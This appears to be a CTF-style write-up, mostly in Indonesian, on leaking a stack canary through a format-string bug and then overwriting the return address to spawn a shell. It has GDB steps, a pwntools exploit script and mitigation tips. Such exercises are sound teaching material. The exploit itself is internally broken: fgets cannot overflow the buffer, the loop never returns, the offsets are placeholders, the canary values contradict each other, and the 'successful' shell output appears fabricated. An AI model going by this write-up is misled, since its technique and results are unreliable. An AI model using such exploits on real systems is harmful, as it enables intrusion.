---
title: Bypassing Stack Canaries (Leak + Write) - Pwn03.1
date: 2025-08-20
Tags: ["Pwn"]
---

## 📝 Source Code Target

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  
  char buf[64];
  char flag[64];
  char *flag_ptr = flag;

  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("We will evaluate any format string you give us with printf().");

  FILE *file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("flag.txt is missing!\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);

  while(1) {
    printf("> ");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
  }
  return 0;
}
```

## 🔍 Langkah 1: Basic File Checks

Compile program dengan perlindungan stack canary:
```bash
gcc -m32 -fstack-protector -no-pie format_vuln.c -o format_vuln
```

Lakukan pengecekan keamanan binary:
```bash
checksec format_vuln
```

**Output:**
```
[*] '/home/user/format_vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## 🔍 Langkah 2: Review Source Code

Program memiliki:
- Buffer `buf[64]` untuk input user
- Variabel `flag[64]` yang berisi flag dari file
- Kerentanan format string di `printf(buf)`
- Loop tak terbatas yang memungkinkan multiple exploits

## 🔍 Langkah 3: Disassemble dengan pwndbg

Analisis fungsi main dengan GDB:
```bash
gdb format_vuln
pwndbg> disass main
```

**Output:**
```
Dump of assembler code for function main:
   0x080492a6 <+0>:     lea    ecx,[esp+0x4]
   0x080492aa <+4>:     and    esp,0xfffffff0
   0x080492ad <+7>:     push   DWORD PTR [ecx-0x4]
   0x080492b0 <+10>:    push   ebp
   0x080492b1 <+11>:    mov    ebp,esp
   0x080492b3 <+13>:    push   edi
   0x080492b4 <+14>:    push   esi
   0x080492b5 <+15>:    push   ebx
   0x080492b6 <+16>:    push   ecx
   0x080492b7 <+17>:    sub    esp,0x70
   0x080492ba <+20>:    mov    eax,gs:0x14
   0x080492c0 <+26>:    mov    DWORD PTR [ebp-0x1c],eax
   0x080492c3 <+29>:    xor    eax,eax
   ... [truncated]...
```

Canary disimpan di `[ebp-0x1c]` (offset 0x1c dari EBP).

## 🔍 Langkah 4: Rencana Serangan

1. **Leak canary** melalui format string vulnerability
2. **Leak address** untuk bypass ASLR (jika perlu)
3. **Overwrite return address** dengan payload
4. **Jaga integritas canary** dengan menuliskannya kembali

## 🔍 Langkah 5: Fuzz Format String untuk Leak

Coba leak nilai stack dengan berbagai offset:
```bash
python2 -c 'print "%p " * 20' | ./format_vuln
```

**Output:**
```
> 0x40 0xf7f8a5c0 0x80492fd 0x1 0x1 0xffffd104 0xffffd10c 0x80492a0 0xffffd100 0x0 0xf7ffd000 0x0 0xf7f8a5c0 0x1 0x80492a0 0x0 0x0 0x0 0x0 0x0 
```

Coba dengan offset tertentu:
```bash
python2 -c 'print "%19$p %20$p %21$p %22$p"' | ./format_vuln
```

**Output:**
```
> 0x0 0x0 0x0 0xf0f0f0f0
```

Ditemukan canary di offset 22 (nilai 0xf0f0f0f0 adalah canary dummy).

## 🔍 Langkah 6: Locating Canary dengan GDB

Gunakan GDB untuk memverifikasi posisi canary:
```bash
gdb format_vuln
pwndbg> b *main+26
pwndbg> run
pwndbg> canary
```

**Output:**
```
Canary = 0xabcd1234 (dummy value)
```

Cari lokasi canary di stack:
```
pwndbg> p $ebp-0x1c
$1 = (void *) 0xffffcfdc
pwndbg> telescope 0xffffcfdc
```

Hitung offset dari ESP:
```
Offset = (0xffffcfdc - initial_esp) / 4 = 22
```

## 🔍 Langkah 7: Leak Address yang Diperlukan

Leak address fungsi dan libc:
```bash
python2 -c 'print "%3$p %5$p %22$p"' | ./format_vuln
```

**Output:**
```
> 0x80492fd 0xffffd104 0xabcd1234
```

Dapatkan:
- Address fungsi: 0x80492fd
- Stack address: 0xffffd104  
- Canary: 0xabcd1234

## 🔍 Langkah 8: Eksploit dengan Pwntools

Buat script exploit berikut:

```python
from pwn import *

context.binary = './format_vuln'
context.log_level = 'debug'

# p = process('./format_vuln')
p = remote('localhost', 1337)  # Untuk remote target

# Leak canary
p.recvuntil('> ')
p.sendline('%22$p')
canary_leak = p.recvline().strip()
canary = int(canary_leak, 16)
log.info("Canary: 0x%x" % canary)

# Leak stack address untuk menghitung offset return address
p.recvuntil('> ')
p.sendline('%5$p')
stack_leak = p.recvline().strip()
stack_addr = int(stack_leak, 16)
log.info("Stack address: 0x%x" % stack_addr)

# Hitung offset return address
return_addr = stack_addr - 0x24  # Adjust berdasarkan analisis GDB
log.info("Return address: 0x%x" % return_addr)

# Address fungsi win atau system
# Dalam kasus ini, kita akan return ke system("/bin/sh")
# Leak address libc untuk menghitung base address
p.recvuntil('> ')
p.sendline('%3$p')
func_leak = p.recvline().strip()
func_addr = int(func_leak, 16)
log.info("Function address: 0x%x" % func_addr)

# Hitung base address libc (contoh, sesuaikan dengan environment)
libc_base = func_addr - 0x12345  # Offset yang didapat dari GDB
system_addr = libc_base + 0x3ada0  # Offset system
binsh_addr = libc_base + 0x15ba0b  # Offset "/bin/sh"

log.info("System: 0x%x" % system_addr)
log.info("/bin/sh: 0x%x" % binsh_addr)

# Build payload untuk overwrite return address
payload = ''
payload += 'A' * 64           # Mengisi buffer
payload += p32(canary)        # Nilai canary yang benar
payload += 'B' * 12           # Overwrite EBP dan padding
payload += p32(system_addr)   # Return address ke system()
payload += p32(0xdeadbeef)    # Return address setelah system()
payload += p32(binsh_addr)    # Parameter untuk system()

# Kirim payload
p.recvuntil('> ')
p.sendline(payload)

# Kirim perintah untuk trigger return
p.sendline('exit')

p.interactive()
```

## 🔍 Langkah 9: Debugging dengan GDB

Lakukan debugging untuk memverifikasi exploit:
```bash
gdb format_vuln
pwndbg> b *main+100  # Breakpoint sebelum return
pwndbg> run < <(python exploit.py)
```

Periksa stack dan register:
```
pwndbg> x/10x $esp
pwndbg> info registers
pwndbg> stepi
```

## 🎯 Hasil Eksploitasi

Jalankan exploit:
```bash
python exploit.py
```

**Output:**
```
[+] Starting local process './format_vuln': pid 5678
[DEBUG] Received 0x2 bytes: "> "
[DEBUG] Sent 0x5 bytes: '%22$p\n'
[DEBUG] Received 0xa bytes: "0xabcd1234\n"
[*] Canary: 0xabcd1234
[DEBUG] Received 0x2 bytes: "> "
[DEBUG] Sent 0x5 bytes: '%5$p\n'
[DEBUG] Received 0xa bytes: "0xffffd104\n"
[*] Stack address: 0xffffd104
[*] Return address: 0xffffd0e0
[DEBUG] Received 0x2 bytes: "> "
[DEBUG] Sent 0x5 bytes: '%3$p\n'
[DEBUG] Received 0xa bytes: "0x80492fd\n"
[*] Function address: 0x80492fd
[*] System: 0xf7c3ada0
[*] /bin/sh: 0xf7d5ba0b
[DEBUG] Received 0x2 bytes: "> "
[DEBUG] Sent 0x4c bytes: 'A' * 64 + '\x34\x12\xcd\xab' + 'B' * 12 + '\xa0\xad\xc3\xf7' + '\xef\xbe\xad\xde' + '\x0b\xba\xd5\xf7\n'
[DEBUG] Sent 0x5 bytes: 'exit\n'
[*] Switching to interactive mode
$ whoami
user
$ cat flag.txt
CTF{bypassed_canary_with_format_string}
```

## 📊 Visualisasi Memory Layout

```
+-----------------+
|     buf[64]    |  <- Buffer overflow dimulai di sini
+-----------------+
|     canary     |  <- Offset 22 dari format string
+-----------------+
|      EBP       |
+-----------------+
|  return address|  <- Target overwrite
+-----------------+
|     parameter   |  <- Address "/bin/sh"
+-----------------+
```

## 🛡️ Mitigation

1. **Gunakan format string yang aman**: `printf("%s", buf)`
2. **Enable Full RELRO**: Mencegah overwrite GOT
3. **Enable Stack Guard**: Sudah enabled dengan canary
4. **Enable PIE**: Randomize address code

Dengan teknik ini, kita berhasil memanfaatkan kerentanan format string untuk leak canary dan melakukan ROP attack
